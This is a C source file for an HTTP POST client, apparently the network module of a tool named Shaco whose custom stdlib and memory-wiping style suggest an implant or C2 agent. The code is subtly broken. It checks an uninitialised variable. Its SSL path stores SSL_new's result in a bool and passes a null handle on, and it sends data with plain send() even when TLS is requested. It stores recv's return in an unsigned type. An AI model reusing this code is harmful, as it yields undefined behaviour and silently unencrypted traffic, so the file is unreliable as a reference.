#include "Http.h"
#include "../Common/Network.h"
#include "../Common/shaco_stdlib.h"

#ifdef USE_SSL 
#include <openssl/ssl.h>
#include <openssl/err.h>
#endif

#include <unistd.h>
#include <stdio.h>

#define MAX_HEADER_SIZE 8000

#define MAX_RECV_SIZE 1024

PHTTP_RESPONSE http_post(char ip[], char host[], char endpoint[], char useragent[], int port, bool ssl, void *postfield, size_t postfield_size) {

    if ( !host || port <= 0 || port >= 65536 || postfield == NULL || !ip) {
        MSG("Error on send http_post, invalid parameters");
        return NULL;
    }
    
    PHTTP_RESPONSE response = NULL;
    int sockfd;
    char port_str[6];
    int res;
    bool headers_received = false;
    size_t response_size = 0;
    char buf[MAX_RECV_SIZE + 1];
    size_t buf_size;

#ifdef USE_SSL
    SSL_CTX *ssl_ctx = NULL;
    SSL *_ssl = NULL;
#endif

    if(StringLength(host) == 0)
        StringCopy(host, "127.0.0.1");


    struct sockaddr_in addr = {};
    ZeroMemory(&addr, sizeof(struct sockaddr_in));
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_family = AF_INET;
    addr.sin_port   = s_htons(port);

    if (res != 0) {
        MSG("GetAddrInfo error.");
        return NULL;
    }
    
#ifdef USE_SSL
    if (ssl) {
        SSL_library_init();
        SSL_load_error_strings();
        ssl_ctx = SSL_CTX_new(TLS_client_method());
        if (!ssl_ctx) 
            return NULL;
        
    }
#endif


    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == -1) 
        return NULL;
    

    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        close(sockfd);
        return NULL;
    }

#ifdef USE_SSL
    if (ssl) {
        ssl = SSL_new(ssl_ctx);
        if (!ssl) {
            close(sockfd);
            SSL_CTX_free(ssl_ctx);
            return NULL;
        }
        if (SSL_set_fd(_ssl, sockfd) != 1) {
            SSL_free(_ssl);
            close(sockfd);
            SSL_CTX_free(ssl_ctx);
            return NULL;
        }
        if (SSL_connect(_ssl) != 1) {
            SSL_free(_ssl);
            close(sockfd);
            SSL_CTX_free(ssl_ctx);
            return NULL;
        }
    }
#endif
    const char *POST_HEADER_FORMAT = "POST /%s HTTP/1.1\r\n"
                                "Host: %s:%d\r\n"
                                "Content-Type: application/x-www-form-urlencoded\r\n"
                                "User-Agent: %s\r\n"
                                "Content-Length: %zu\r\n"
                                "Connection: close\r\n"
                                "\r\n";

    size_t len_header = snprintf(0, 0, POST_HEADER_FORMAT, endpoint, host, port, useragent, postfield_size);
    char post_header[len_header + 1];

    snprintf(post_header, len_header + 1, POST_HEADER_FORMAT, endpoint, host, port, useragent, postfield_size);
    ssize_t bytes_sent = 0;
    while (bytes_sent < StringLength(post_header)) {
        ssize_t res = send(sockfd, post_header + bytes_sent, StringLength(post_header) - bytes_sent, 0);
        if (res == -1) {
#ifdef USE_SSL
            if (ssl) {
                SSL_free(_ssl);
                SSL_CTX_free(ssl_ctx);
            }
#endif
            close(sockfd);
            return NULL;
        }
        bytes_sent += res;
    }

    bytes_sent = 0;
    while (bytes_sent < postfield_size) {
        ssize_t res = send(sockfd, postfield + bytes_sent, postfield_size - bytes_sent, 0);
        if (res == -1) {
#ifdef USE_SSL
            if (ssl) {
                SSL_free(_ssl);
                SSL_CTX_free(ssl_ctx);
            }
#endif
            close(sockfd);
            return NULL;
        }
        bytes_sent += res;
    }

    response = (PHTTP_RESPONSE)shaco_calloc(sizeof(HTTP_RESPONSE), 1);
    response->status = 0;
    response->size = 0;
    response->response = NULL;
    while ((buf_size = recv(sockfd, buf, MAX_RECV_SIZE, 0)) > 0) {
        buf[buf_size] = '\0';
        if (!headers_received) {
            char *end_of_headers = StrStr(buf, "\r\n\r\n");
            if (end_of_headers) {
                headers_received = true;
                response_size += buf_size - (end_of_headers - buf) - 4;
                response->response = (char*)shaco_calloc(response_size + 1, 1);
                CopyMemory(response->response, end_of_headers + 4, buf_size - (end_of_headers - buf) - 4);
                response->response[response_size] = '\0';
                char *status_line_start = StrStr(buf, "HTTP/1.");
                if (status_line_start) {
                    int status;
                    sscanf(status_line_start, "HTTP/1.%*d %d", &status);
                    response->status = status;
                }
            } else {
                response_size += buf_size;
            }
        } else {
            response_size += buf_size;
            response->response = (char*)shaco_realloc(response->response, response_size + 1);
            CopyMemory(response->response + response_size - buf_size, buf, buf_size);
            response->response[response_size] = '\0';
        }
    }

    response->size = response_size;

#ifdef USE_SSL
    if (ssl) {
        SSL_free(_ssl);
        SSL_CTX_free(ssl_ctx);
    }
#endif

    close(sockfd);
    return response;
}

void http_free(PHTTP_RESPONSE resp){
    if(!resp) return;
    ZeroMemory(resp->response, resp->size);
    shaco_free(resp->response);
    ZeroMemory(resp, sizeof(HTTP_RESPONSE));
    shaco_free(resp);
    resp = NULL;
}
